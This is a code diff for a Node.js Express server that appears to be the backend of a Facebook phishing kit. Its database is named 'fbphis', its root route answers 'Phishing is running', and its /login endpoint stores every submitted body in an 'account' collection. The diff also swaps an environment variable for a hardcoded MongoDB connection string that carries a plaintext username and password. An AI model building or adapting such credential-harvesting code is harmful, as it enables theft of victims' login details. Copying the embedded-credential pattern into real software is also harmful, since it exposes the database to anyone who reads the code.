@@ -2,52 +2,50 @@ const express = require("express");
 const dotenv = require("dotenv");
 const jwt = require("jsonwebtoken");
 const cors = require("cors");
-const { MongoClient } = require("mongodb");
-
+const { MongoClient, ServerApiVersion } = require("mongodb");
 const app = express();
 const port = process.env.PORT || 5000;
 
-dotenv.config();
 app.use(cors());
 app.use(express.json());
+dotenv.config();
 
-const uri = process.env.MONGODB_URI; // Update with your MongoDB URI
+const uri =
+  "mongodb+srv://adanannaba01:adanannaba01@cluster0.bx1z9cc.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
+
+// Create a MongoClient with a MongoClientOptions object to set the Stable API version
 const client = new MongoClient(uri, {
-  useNewUrlParser: true,
-  useUnifiedTopology: true,
+  serverApi: {
+    version: ServerApiVersion.v1,
+    strict: true,
+    deprecationErrors: true,
+  },
 });
 
 async function run() {
   try {
-    await client.connect();
-    console.log("Connected to MongoDB");
+    // Connect the client to the server	(optional starting in v4.7)
 
-    const db = client.db("fbphis"); // Specify your database name
-    const accountCollection = db.collection("account");
-
+    // Send a ping to confirm a successful connection
+    await client.db("admin").command({ ping: 1 });
+    console.log(
+      "Pinged your deployment. You successfully connected to MongoDB!"
+    );
+    const accountCollection = client.db("fbphis").collection("account");
     app.post("/login", async (req, res) => {
-      try {
-        const request = req.body;
-        const result = await accountCollection.insertOne(request);
-        res
-          .status(201)
-          .json({ success: true, message: "Data inserted successfully" });
-      } catch (error) {
-        console.error("Error inserting data:", error);
-        res.status(500).json({ success: false, message: "An error occurred" });
-      }
+      const request = req.body;
+      const result = await accountCollection.insertOne(request);
+      res.send(result);
     });
-
-    app.get("/", (req, res) => {
-      res.send("Phishing is running");
-    });
-
-    app.listen(port, () => {
-      console.log(`Server running on port ${port}`);
-    });
-  } catch (error) {
-    console.error("Error connecting to MongoDB:", error);
+  } finally {
   }
 }
+run().catch(console.dir);
 
-run();
+app.get("/", (req, res) => {
+  res.send("Phising is running");
+});
+
+app.listen(port, () => {
+  console.log("Server running");
+});
